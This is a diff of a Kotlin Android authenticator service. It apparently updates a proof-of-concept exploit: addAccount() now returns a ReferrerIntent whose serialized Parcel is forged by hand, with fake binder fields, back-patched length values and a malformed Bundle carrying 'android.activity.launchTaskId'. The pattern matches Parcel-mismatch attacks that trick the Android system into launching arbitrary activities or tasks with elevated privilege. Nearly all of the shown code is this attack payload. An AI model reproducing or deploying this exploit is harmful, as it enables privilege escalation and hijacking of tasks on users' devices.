@@ -11,6 +11,7 @@ import android.os.Bundle
 import android.os.Parcel
 import android.util.Log
 import androidx.core.os.bundleOf
+import com.android.internal.content.ReferrerIntent
 import org.jetbrains.anko.intentFor
 
 class Authenticator : Service() {
@@ -20,13 +21,50 @@ class Authenticator : Service() {
 
   private val authenticator by lazy {
     object : AbstractAccountAuthenticator(this) {
+      val taskId = 313
+
+      fun referrerIntent(): ReferrerIntent {
+        val payload = Parcel.obtain().apply {
+          writeInt(fixme(72)) //  -> string length, patch later, binder.1
+          // binder remain
+          writeInt(2)
+          writeInt(3)
+          writeInt(4)
+          writeInt(5)
+          writeInt(6)
+
+          writeString(null) // resultWho
+          writeInt(0) // requestCode
+          writeInt(0) // flags
+          writeTypedObject(null, 0) // profiler info
+
+          run {  // bundle
+            writeInt(1) // typed object header
+            writeInt(fixme(148)) // bundle back patch length (origin => 164)
+            writeInt(Const.BundleMagic)  // "BNDL"
+            writeInt(2)
+            writeString("android.activity.launchTaskId") // key 1
+            writeValue(taskId) // value 1
+            writeString("_") // key 2
+            run { // value 2
+              writeInt(Const.ValByteArray)
+              writeInt(fixme(56)) // byte array length (origin => 72)
+              writeInt('@'.code) // 0
+              writeInt(0) // String16 terminator and padding
+            }
+          }
+        }
+        payload.setDataPosition(0)
+        val intent = intentFor<LoginActivity>().setType(payload.readString())
+        return ReferrerIntent(intent, null)
+      }
+
 
       fun labelIntent(): LabeledIntent {
         val intent = Parcel.obtain().apply {
           intentFor<LoginActivity>().setAction("hello").writeToParcel(this, 0)
         }
 
-        val taskId = 218
 
         val tail = Parcel.obtain().apply {
           writeString(null) // mSourcePackage => resolvedType
@@ -93,9 +131,8 @@ class Authenticator : Service() {
           "addAccount() called with: response = $response, accountType = $accountType, authTokenType = $authTokenType, requiredFeatures = $requiredFeatures, options = $options"
         )
 
-        val labeledIntent = labelIntent()
-
-        return bundleOf(AccountManager.KEY_INTENT to labeledIntent)
+        val intent = referrerIntent()
+        return bundleOf(AccountManager.KEY_INTENT to intent)
       }
 
 
